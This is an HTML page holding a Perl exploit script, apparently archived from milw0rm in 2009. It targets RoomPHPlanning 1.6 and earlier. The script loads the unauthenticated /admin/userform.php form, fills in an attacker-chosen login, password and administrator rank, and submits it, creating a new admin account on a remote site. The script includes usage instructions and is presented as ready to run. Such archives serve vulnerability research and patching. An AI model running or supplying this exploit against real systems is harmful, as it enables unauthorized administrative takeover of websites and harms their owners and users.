<html><head><title>RoomPHPlanning <= 1.6 (userform.php) Create Admin User Exploit</title></head><pre>#!/usr/bin/perl -w

use LWP::UserAgent;
use HTML::Form;

	print &quot;_________________________________________________________\n&quot;;
	print &quot;[+]=&gt;RoomPHPlanning\n&quot;;
	print &quot;[+]=&gt;v1.x\n&quot;;
	print &quot;[+]=&gt;Vul: Remote Create user with all permissions (admin)\n&quot;;
	print &quot;[+]=&gt;Author: Jonathan Salwan \n&quot;;
	print &quot;[+]=&gt;Web: http://www.shell-storm.org\n&quot;;
	print &quot;[+]=&gt;Mail: submit [AT] shell-storm.org\n&quot;;
	print &quot;_________________________________________________________\n\n&quot;;
    
sub usage {
	print &quot;[+]=&gt;usage: &lt;file.pl&gt; &lt;host_&amp;_patch&gt; &lt;login&gt; &lt;password&gt;\n&quot;;
	print &quot;[+]=&gt;Ex: flood.pl http://localhost/patch/ admin2 toto\n&quot;;exit;
}

if ($#ARGV &lt; 2) {usage();}

	$patch 	= &quot;/admin/userform.php&quot;;
	$host 	= $ARGV[0].$patch;
	$login 	= $ARGV[1];
	$pwd 	= $ARGV[2];
	$name 	= &quot;Administrateur&quot;;
	$rank 	= &quot;1&quot;;

		print &quot;[+]=&gt;Sending...\n&quot;;


    			my $u = LWP::UserAgent-&gt;new(agent =&gt; 'Mozilla/4.73 [en] (X11; I; Linux 2.2.16 i686; Nav)' );
			my $req = HTTP::Request-&gt;new( GET =&gt; &quot;${host}&quot; );
			my $res = $u-&gt;request($req);
			my $send = HTML::Form-&gt;parse( $res-&gt;content, $host );

    	$send-&gt;find_input('name')-&gt;value($name);
    	$send-&gt;find_input('login')-&gt;value($login);
    	$send-&gt;find_input('pwd')-&gt;value($pwd);		
	$send-&gt;find_input('rank')-&gt;value($rank);    	
	
	$u-&gt;request( $send-&gt;click );

		print &quot;[+]=&gt;Done!\n&quot;;
		print &quot;[+]=&gt;Now, user $ARGV[1] is admin\n&quot;;

# milw0rm.com [2009-03-10]</pre></html>